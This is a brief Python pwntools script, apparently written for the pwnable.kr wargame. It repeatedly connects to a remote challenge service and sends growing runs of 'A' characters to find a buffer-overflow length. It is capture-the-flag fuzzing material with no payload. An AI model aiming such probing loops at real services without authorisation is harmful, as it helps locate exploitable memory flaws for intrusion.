from pwn import *

r = remote("pwnable.kr", 9000)
size= 10
while True:
    load = "A"*size
    print("Sending String with Size : "+ str(size))
    r.send(load+"\n")
    reply = r.recvrepeat(10)
    print("Server Response : "+reply)
    r.close()
    print("----Trying again------")
    size = size + 10
    r = remote("pwnable.kr", 9000)
